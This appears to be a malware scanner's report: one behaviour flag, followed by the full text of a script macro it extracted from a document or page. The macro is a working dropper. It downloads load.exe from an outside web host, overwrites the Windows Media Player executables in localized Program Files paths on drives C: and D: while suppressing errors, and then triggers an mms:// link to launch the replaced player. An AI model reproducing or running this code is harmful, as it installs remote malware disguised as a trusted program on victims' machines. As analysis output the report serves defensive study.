behavior.msxml2.XMLHTTP: May download files from the Internet

docinfo.macro:
<script language=vbs>
set oHTTP = CreateObject("msxml2.XMLHTTP")
oHTTP.open "GET", "http://www.free3xmatures.com/del/nt/load.exe", False
oHTTP.send
set oStream = createobject("adodb.stream")
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
oStream.type = adTypeBinary
oStream.open
oStream.write oHTTP.responseBody
dim a(7)
a(0)="Programmer"
a(1)="Programe"
a(2)="Programmi"
a(3)="Programfiler"
a(4)="Programas"
a(5)="Archivos de programa"
a(6)="Program Files"
for i=0 to 6 step 1
s="C:\\" & a(i) & "\\Windows Media Player\\wmplayer.exe"
s1="C:\\" & a(i) & "\\Windows Media Player\\mplayer2.exe"
s2="D:\\" & a(i) & "\\Windows Media Player\\wmplayer.exe"
s3="D:\\" & a(i) & "\\Windows Media Player\\mplayer2.exe"
on error resume next
oStream.savetofile s, adSaveCreateOverWrite
on error resume next
oStream.savetofile s1, adSaveCreateOverWrite
on error resume next
oStream.savetofile s2, adSaveCreateOverWrite
on error resume next
oStream.savetofile s3, adSaveCreateOverWrite
next
</script>
<script language="javascript">
location.href = "mms://";
</script>
